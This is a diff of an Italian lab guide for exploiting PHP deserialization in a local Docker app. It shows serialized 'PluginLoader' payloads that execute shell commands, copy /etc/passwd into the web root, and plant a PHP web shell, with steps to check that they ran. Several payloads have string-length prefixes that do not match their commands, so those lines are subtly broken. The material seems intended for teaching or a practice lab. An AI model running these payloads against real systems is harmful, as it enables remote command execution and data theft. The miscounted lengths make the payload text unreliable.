@@ -91,26 +91,50 @@ O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/t
 2. Nel campo "Configurazione (formato serializzato PHP)", inserisci:
 
 ```php
-O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:23:"cat /etc/passwd > /tmp/pw";}
+O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}
 ```
 
 3. Clicca su "Salva Configurazione"
 4. Il comando verrà eseguito immediatamente durante la deserializzazione!
+5. **Dopo il salvataggio, la pagina mostrerà automaticamente l'output del comando** se è stato eseguito correttamente
 
 #### Passo 4: Verificare Esecuzione
 
+**Metodo 1: Verifica nella pagina web**
+- Dopo aver salvato la configurazione, se il comando è stato eseguito, vedrai un alert giallo con l'output del comando nella stessa pagina
+
+**Metodo 2: Verifica tramite container Docker**
 1. Accedi al container Docker:
    ```bash
    docker exec -it <container_id> bash
    ```
 2. Verifica che il file sia stato creato:
    ```bash
-   cat /tmp/pw
+   cat /tmp/test.txt
    ```
+   oppure
+   ```bash
+   ls -la /tmp/plugin_exec_*.txt
+   ```
+
+**Metodo 3: Verifica tramite file accessibile via web**
+Usa un payload che scrive l'output in una directory accessibile via web:
+```php
+O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:28:"whoami > /var/www/html/whoami.txt";}
+```
+Poi visita `http://localhost:8008/whoami.txt` per vedere l'output.
 
 #### Payload Avanzati
 
-**Esecuzione Comando con Output:**
+**Esecuzione Comando con Output (visibile nella pagina):**
+
+```php
+O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}
+```
+
+Dopo aver salvato, l'output del comando verrà mostrato automaticamente nella pagina di configurazione.
+
+**Esecuzione Comando con Output (accessibile via web):**
 
 ```php
 O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:28:"whoami > /var/www/html/whoami.txt";}
@@ -130,11 +154,15 @@ O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:58:"bash -c 'ba
 O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:35:"cat /etc/passwd > /var/www/html/passwd.txt";}
 ```
 
-**Modificare File:**
+Dopo aver salvato, visita `http://localhost:8008/passwd.txt` per vedere il contenuto.
+
+**Modificare File (creare web shell):**
 
 ```php
-O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:42:"echo '<?php system(\$_GET[\"cmd\"]); ?>' > shell.php";}
+O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:42:"echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php";}
 ```
+
+Dopo aver salvato, visita `http://localhost:8008/shell.php?cmd=id` per eseguire comandi.
 
 #### Sfruttare __destruct() con PluginConfig
 
